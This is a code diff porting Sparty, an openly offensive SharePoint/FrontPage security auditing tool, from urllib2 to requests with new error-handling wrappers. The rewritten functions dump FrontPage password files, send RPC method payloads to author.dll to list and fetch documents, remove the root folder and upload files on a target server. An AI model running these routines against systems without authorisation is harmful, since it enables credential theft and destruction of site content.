@@ -1,8 +1,13 @@
-#!/usr/bin/python
+#! python3
 # Sparty - Sharepoint/Frontend Auditor
 # By: Aditya K Sood - SecNiche Security Labs ! (c) 2013
 
-import os, sys, urllib2, re, optparse, httplib
+import os, sys, re, optparse
+
+from contextlib import contextmanager
+
+# import argparse
+import requests
 
 __copyright__ = 'Copyright (c) 2013, {Aditya K Sood}'
 __license__   = 'BSD'
@@ -196,12 +201,12 @@ def banner():
             _|  _|        _|    _|  _|    _|      _|          _|
         _|_|_|    _|        _|    _|  _|    _|      _|          _|
 
-        SPARTY : Sharepoint/Frontpage Security Auditing Tool!
-        Authored by: Aditya K Sood |{0kn0ck}@secniche.org  | 2013
-        Twitter:     @AdityaKSood
-        Powered by: SecNiche Security Labs !
+        SPARTY      : Sharepoint/Frontpage Security Auditing Tool!
+        Authored by : Aditya K Sood | 0kn0ck@secniche.org  | 2013
+        Twitter     : @AdityaKSood
+        Powered by  : SecNiche Security Labs !
     """
-    print(sparty_banner)
+    print("\t" + sparty_banner.strip())
     print("\t--------------------------------------------------------------")
 
 
@@ -216,6 +221,46 @@ def sparty_usage(destination):
     print("\t\t: (2) always provide the proper directory structure where sharepoint/frontpage is installed !")
     print("\t\t: (3) do not specify '/' at the end of url !")
 
+class fragile(object):
+    class Break(Exception):
+        """Break out of the with statement"""
+
+    def __init__(self, value):
+        self.value = value
+
+    def __enter__(self):
+        return self.value.__enter__()
+
+    def __exit__(self, etype, value, traceback):
+        error = self.value.__exit__(etype, value, traceback)
+        if etype == self.Break:
+            return True
+        return error
+
+@contextmanager
+def request_url(destination, data=None, *args, **kwargs):
+    r = None
+    try:
+        r = requests.post(destination, data=data, headers=DEFAULT_HEADERS) if data else requests.get(destination)
+        r.raise_for_status()
+    except requests.exceptions.HTTPError as err:
+        print("[-] url error ! - %s" % err)
+        r = None
+
+    except requests.exceptions.ConnectionError as err:
+        print("[-] connecting error ! - %s" % err)
+        r = None
+
+    except requests.exceptions.Timeout as err:
+        print("[-] timeout error ! - %s" % err)
+        r = None
+
+    except requests.exceptions.RequestException as err:
+        print("[-] unknown error ! - %s" % err)
+        r = None
+
+    finally:
+        yield r
 
 # build target for scanning frontpage and sharepoint files
 
@@ -233,33 +278,24 @@ def module_success(module_name):
 # extracting information about target's enviornment !
 
 def target_information(name):
-    try:
-        headers = urllib2.urlopen(name)
-        print("[+] fetching information from the given target : (%s)" % (headers.geturl()))
-        print("[+] target responded with HTTP code: (%s)" % headers.getcode())
-        print("[+] target is running server: (%s)" % headers.info()['server'])
-
-    except urllib2.HTTPError as h:
-        print("[-] url error occured - (%s)" % h.code)
-        pass
+    with fragile(request_url(name)) as r:
+        if r is None: raise fragile.Break
+        print("[+] fetching information from the given target : (%s)" % (r.url))
+        print("[+] target responded with HTTP code: (%s)"             % (r.status_code))
+        print("[+] target is running server: (%s)"                    % (r.headers['server']))
 
 
 # audit function for scanning frontpage and sharepoint files
 
 def audit(target=[]):
     for element in target:
-        try:
-            handle = urllib2.urlopen(element)
-            # info = handle.info()
-            response_code = handle.getcode()
-            print("[+] (%s) - (%d)" % (element, response_code))
-
-        except urllib2.HTTPError as h:
-            print("[-] (%s) - (%d)" % (element, h.code))
-
-        except httplib.BadStatusLine:
-            print("[-] server responds with bad status !")
-            pass
+        with fragile(request_url(element)) as r:
+            if r is None: raise fragile.Break
+            status_code = r.status_code
+            if status_code == requests.codes.ok:
+                print("[+] (%s) - (%d)" % (element, status_code))
+            else:
+                print("[-] (%s) - (%d)" % (element, status_code))
 
 # dump frontpage service and administrators password files if present
 
@@ -275,26 +311,21 @@ def dump_credentials(dest):
         pwd_targets.append(dest + "/" + item)
 
     for entry in pwd_targets:
-        try:
-            handle = urllib2.urlopen(entry)
-            if handle.getcode() == 200:
+        with fragile(request_url(entry)) as r:
+            if r is None: raise fragile.Break
+            status_code = r.status_code
+            if status_code == requests.codes.ok:
                 print("[+] dumping contents of file located at : (%s)" % (entry))
                 filename = "__dump__.txt"
                 dump = open(filename, 'a')
-                dump.write(handle.read())
-                print(handle.read())
-
-        except urllib2.HTTPError as h:
-            print("[-] could not dump the file located at : (%s) | (%d)" % (entry, h.code))
-            continue
-
-        except httplib.BadStatusLine:
-            print("[-] server responds with bad status !")
-            continue
+                dump.write(r.text)
+                print(r.text)
+            else:
+                print("[-] could not dump the file located at : (%s) | (%d)" % (entry, status_code))
 
         print("[*] ---------------------------------------------------------------------------------------")
 
-    print("[+] check the (%s) file if generated !\n" % (filename))
+        # print("[+] check the (%s) file if generated !\n" % (filename))
 
 # fingerprinting frontpage version using default files !
 
@@ -317,38 +348,26 @@ def fingerprint_frontpage(name):
         build_enum_nix.append(name + "/" + item)
 
     for entry in build_enum_nix:
-        try:
-            info = urllib2.urlopen(entry)
-            if info.getcode() == 200:
-                print("[+] front page is tested as : nix version |  (%s) | (%d)" % (entry, info.getcode()))
-
-        except urllib2.HTTPError:
-            pass
+        with fragile(request_url(entry)) as r:
+            if r is None: raise fragile.Break
+            status_code = r.status_code
+            if status_code == requests.codes.ok:
+                print("[+] front page is tested as : nix version |  (%s) | (%d)" % (entry, status_code))
 
     for item in enum_win:
         build_enum_win.append(name + "/" + item)
 
     for entry in build_enum_win:
-        try:
-            info = urllib2.urlopen(entry)
-            if info.getcode() == 200:
-                print("[+] front page is tested as : windows version |  (%s) | (%d)" % (entry, info.getcode()))
-
-        except urllib2.HTTPError:
-            pass
+        with fragile(request_url(entry)) as r:
+            if r is None: raise fragile.Break
+            status_code = r.status_code
+            if status_code == requests.codes.ok:
+                print("[+] front page is tested as : windows version |  (%s) | (%d)" % (entry, status_code))
 
     frontend_version = name + "/_vti_inf.html"
-    try:
-        version = urllib2.urlopen(frontend_version)
-        print("[+] extracting frontpage version from default file : (%s):" % re.findall(r'FPVersion=(.*)', version.read()))
-
-    except urllib2.HTTPError:
-        print("[-] failed to extract the version of frontpage from default file!")
-        pass
-
-    except httplib.BadStatusLine:
-        print("[-] server responds with bad status !")
-        pass
+    with fragile(request_url(frontend_version)) as r:
+        if r is None: raise fragile.Break
+        print("[+] extracting frontpage version from default file : (%s):" % re.findall(r'FPVersion=(.*)', r.text))
 
     print("[*] ---------------------------------------------------------------------------------------")
 
@@ -356,34 +375,22 @@ def fingerprint_frontpage(name):
 
 def dump_sharepoint_headers(name):
     print("")
-    try:
-        dump_s = urllib2.urlopen(name)
-        print("[+] configured sharepoint version is  : (%s)" % dump_s.info()['microsoftsharepointteamservices'])
 
-    except KeyError:
-        print("[-] sharepoint version could not be extracted using HTTP header :  MicrosoftSharepointTeamServices !")
+    headers = {
+        'microsoftsharepointteamservices' : 'sharepoint version',
+        'x-sharepointhealthscore'         : 'load balancing ability',
+        'sprequestguid'                   : 'diagnostics ability'
+    }
+    with fragile(request_url(name)) as r:
+        if r is None: raise fragile.Break
+        for header in headers:
+            try:
+                desc = headers[header]
+                rHeader = r.headers[header]
+                print(f"[+] configured {desc} is : ({rHeader})")
 
-    try:
-        dump_f = urllib2.urlopen(name)
-        print("[+] sharepoint is configured with load balancing capability : (%s)" % dump_f.info()['x-sharepointhealthscore'])
-
-    except KeyError:
-        print("[-] sharepoint load balancing ability could not be determined using HTTP header : X-SharepointHealthScore !")
-
-    try:
-        dump_g = urllib2.urlopen(name)
-        print("[+] sharepoint is configured with explicit diagnosis (GUID based log analysis) purposes : (%s)" % dump_g.info()['sprequestguid'])
-
-    except KeyError:
-        print("[-] sharepoint diagnostics ability could not be determined using HTTP header : SPRequestGuid !")
-
-    except urllib2.HTTPError:
-        pass
-
-    except httplib.BadStatusLine:
-        print("[-] server responds with bad status !")
-        pass
-
+            except KeyError:
+                print(f"[-] {headers[header]} could not be extracted using HTTP header : {header} !")
 
 # file uploading routine to upload file remotely on frontpage extensions
 
@@ -400,43 +407,26 @@ def frontpage_rpc_check(name):
         destination = name + "/" + item
 
     print("[+] Sending HTTP GET request to - (%s) for verifying whether RPC is listening !" % destination)
-    try:
-        req = urllib2.Request(destination)
-        response = urllib2.urlopen(req)
-        if response.getcode() == 200:
-            print("[+] target is listening on frontpage RPC - (%s) !\n" % response.getcode())
+    with fragile(request_url(destination)) as r:
+        if r is None: raise fragile.Break
+        status_code = r.status_code
+        if status_code == requests.codes.ok:
+            print("[+] target is listening on frontpage RPC - (%s) !\n" % status_code)
         else:
-            print("[-] target is not listening on frontpage RPC - (%s) !\n" % response.getcode())
-
-    except urllib2.URLError as e:
-        print("[-] url error ! - %s" % e.code)
-        pass
-
-    except httplib.BadStatusLine:
-        print("[-] server responds with bad status !")
-        pass
+            print("[-] target is not listening on frontpage RPC - (%s) !\n" % status_code)
 
     print("[+] Sending HTTP POST request to retrieve software version - (%s)" % destination)
-    try:
-        req = urllib2.Request(destination, data, DEFAULT_HEADERS)
-
-        response = urllib2.urlopen(req)
-        if response.getcode() == 200:
-            print("[+] target accepts the request - (%s) | (%s) !\n" % (data, response.getcode()))
+    with fragile(request_url(destination, data)) as r:
+        if r is None: raise fragile.Break
+        status_code = r.status_code
+        if status_code == requests.codes.ok:
+            print("[+] target accepts the request - (%s) | (%s) !\n" % (data, status_code))
             filename = "__version__.txt" + ".html"
             version = open(filename, 'a')
-            version.write(response.read())
+            version.write(r.text)
             print("[+] check file for contents - (%s) \n" % filename)
         else:
-            print("[-] target fails to accept request - (%s) | (%s) !\n" % (data, response.getcode()))
-
-    except urllib2.URLError as e:
-        print("[-] url error, seems like authentication is required or server failed to handle request! - - %s" % e.code)
-        pass
-
-    except httplib.BadStatusLine:
-        print("[-] server responds with bad status !")
-        pass
+            print("[-] target fails to accept request - (%s) | (%s) !\n" % (data, status_code))
 
     print("[*] ---------------------------------------------------------------------------------------")
 
@@ -460,27 +450,18 @@ def frontpage_service_listing(name):
         destination = name + "/" + item
 
     print("[+] Sending HTTP POST request to retrieve service listing  - (%s)" % destination)
-    try:
-        for entry in data:
-            req = urllib2.Request(destination, entry, DEFAULT_HEADERS)
-            response = urllib2.urlopen(req)
-            if response.getcode() == 200:
-                print("[+] target accepts the request - (%s) | (%s) !" % (entry, response.getcode()))
+    for entry in data:
+        with fragile(request_url(destination, entry)) as r:
+            if r is None: raise fragile.Break
+            status_code = r.status_code
+            if status_code == requests.codes.ok:
+                print("[+] target accepts the request - (%s) | (%s) !" % (entry, status_code))
                 filename = "__service-list__.txt" + entry + ".html"
                 service_list = open(filename, 'a')
-                service_list.write(response.read())
+                service_list.write(r.text)
                 print("[+] check file for contents - (%s) \n" % filename)
-
             else:
-                print("[-] target fails to accept request - (%s) | (%s) !\n" % (data, response.getcode()))
-
-    except urllib2.URLError as e:
-        print("[-] url error, seems like authentication is required or server failed to handle request! - - %s" % e.code)
-        pass
-
-    except httplib.BadStatusLine:
-        print("[-] server responds with bad status !")
-        pass
+                print("[-] target fails to accept request - (%s) | (%s) !\n" % (entry, status_code))
 
     print("[*] ---------------------------------------------------------------------------------------")
 
@@ -492,42 +473,40 @@ def frontpage_config_check(name):
 
     front_exp_target = '_vti_bin/_vti_aut/author.dll'
     payloads = [
-        'method=open service:3.0.2.1706&service_name=/', 'method=list documents:3.0.2.1706&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
+        'method=open service:3.0.2.1706&service_name=/',
+        'method=list documents:3.0.2.1706&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
         'method=getdocument:3.0.2.1105&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
-        'method=open service:4.0.2.4715&service_name=/', 'method=list documents:4.0.2.4715&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
+        'method=open service:4.0.2.4715&service_name=/',
+        'method=list documents:4.0.2.4715&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
         'method=getdocument:4.0.2.4715&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
-        'method=open service:5.0.2.4803&service_name=/', 'method=list documents:5.0.2.4803&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
+        'method=open service:5.0.2.4803&service_name=/',
+        'method=list documents:5.0.2.4803&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
         'method=getdocument:5.0.2.4803&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
-        'method=open service:5.0.2.2623&service_name=/', 'method=list documents:5.0.2.2623&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
+        'method=open service:5.0.2.2623&service_name=/',
+        'method=list documents:5.0.2.2623&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
         'method=getdocument:5.0.2.2623&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version=',
-        'method=open service:6.0.2.5420&service_name=/', 'method=list documents:6.0.2.5420&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
+        'method=open service:6.0.2.5420&service_name=/',
+        'method=list documents:6.0.2.5420&service_name=&listHiddenDocs=false&listExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=false&listIncludeParent=true&listDerivedT=false&listBorders=false&initialUrl=',
         'method=getdocument:6.0.2.5420&service_name=&document_name=about/default.htm&old_theme_html=false&force=true&get_option=none&doc_version='
     ]
 
     for item in payloads:
         destination = name + "/" + front_exp_target
         print("[+] Sending HTTP POST request to [open service | listing documents] - (%s)" % destination)
-        try:
-            req = urllib2.Request(destination, item, DEFAULT_HEADERS)
-            response = urllib2.urlopen(req)
+        with fragile(request_url(destination, item)) as r:
+            if r is None: raise fragile.Break
+            status_code = r.status_code
 
-            if response.getcode() == 200:
-                print("[+] target accepts the request - (%s) | (%s) !\n" % (item, response.getcode()))
+            if status_code == requests.codes.ok:
+                print("[+] target accepts the request - (%s) | (%s) !" % (item, status_code))
                 filename = "__author-dll-config__.txt" + ".html"
                 service_list = open(filename, 'a')
-                service_list.write(response.read())
+                service_list.write(r.text)
                 print("[+] check file for contents - (%s) \n" % filename)
 
             else:
-                print("[-] target fails to accept request - (%s) | (%s) !\n" % (item, response.getcode()))
+                print("[-] target fails to accept request - (%s) | (%s) !\n" % (item, status_code))
 
-        except urllib2.URLError as e:
-            print("[-] url error, seems like authentication is required or server failed to handle request! - %s \n[-] payload [%s]\n" % (e.code, item))
-            pass
-
-        except httplib.BadStatusLine:
-            print("[-] server responds with bad status !")
-            pass
 
 # remove specific folder from the web server
 
@@ -547,24 +526,15 @@ def frontpage_remove_folder(name):
     for item in payloads:
         destination = name + "/" + file_exp_target
         print("[+] Sending HTTP POST request to remove '/' directory to - (%s)" % destination)
-        try:
-            req = urllib2.Request(destination, item, DEFAULT_HEADERS)
-            response = urllib2.urlopen(req)
-            if response.getcode() == 200:
-                print("[+] folder removed successfully - (%s) | (%s) !\n" % (item, response.getcode()))
-                for line in response.readlines():
-                    print(line)
+        with fragile(request_url(destination, item)) as r:
+            if r is None: raise fragile.Break
+            status_code = r.status_code
+
+            if status_code == requests.codes.ok:
+                print("[+] folder removed successfully - (%s) | (%s) !\n" % (item, status_code))
+                print(r.text)
             else:
-                print("[-] fails to remove '/' folder at  - (%s) | (%s) !\n" % (item, response.getcode()))
-
-        except urllib2.URLError as e:
-            print("[-] url error, seems like authentication is required or server failed to handle request! - %s \n[-] payload [%s]\n" % (e.code, item))
-            pass
-
-        except httplib.BadStatusLine:
-            print("[-] server responds with bad status !")
-            pass
-
+                print("[-] fails to remove '/' folder at  - (%s) | (%s) !\n" % (item, status_code))
 
 # file uploading through author.dll
 
@@ -585,23 +555,17 @@ def file_upload_check(name):
     for item in payloads:
         destination = name + "/" + file_exp_target
         print("[+] Sending HTTP POST request for uploading file to - (%s)" % destination)
-        try:
-            req = urllib2.Request(destination, item, DEFAULT_HEADERS)
-            response = urllib2.urlopen(req)
-            if response.getcode() == 200:
-                print("[+] file uploaded successfully - (%s) | (%s) !\n" % (item, response.getcode()))
-                for line in response.readlines():
-                    print(line)
+
+        with fragile(request_url(destination, item)) as r:
+            if r is None: raise fragile.Break
+            status_code = r.status_code
+
+            if status_code == requests.codes.ok:
+                print("[+] file uploaded successfully - (%s) | (%s) !\n" % (item, status_code))
+                print(r.text)
             else:
-                print("[-] file fails to upload at  - (%s) | (%s) !\n" % (item, response.getcode()))
+                print("[-] file fails to upload at  - (%s) | (%s) !\n" % (item, status_code))
 
-        except urllib2.URLError as e:
-            print("[-] url error, seems like authentication is required or server failed to handle request! - %s \n[-] payload [%s]\n" % (e.code, item))
-            pass
-
-        except httplib.BadStatusLine:
-            print("[-] server responds with bad status !")
-            pass
 
 # main routine to trigger sub routines (functions) !
 
@@ -784,22 +748,8 @@ def main():
         sparty_usage()
         sys.exit(0)
 
-    except urllib2.HTTPError as h:
-        print("[-] HTTPError : %s" % h.code)
-        print("[+] please specify the target with protocol handlers as http | https")
-        sys.exit(0)
-
-    except urllib2.URLError as u:
-        print("[-] URLError : %s" % u.args)
-        print("[+] please specify the target with protocol handlers as http | https")
-        sys.exit(0)
-
     except KeyboardInterrupt:
         print("[-] halt signal detected, exiting the program !\n")
-        sys.exit(0)
-
-    except None:
-        print("[] Hey")
         sys.exit(0)
 
 
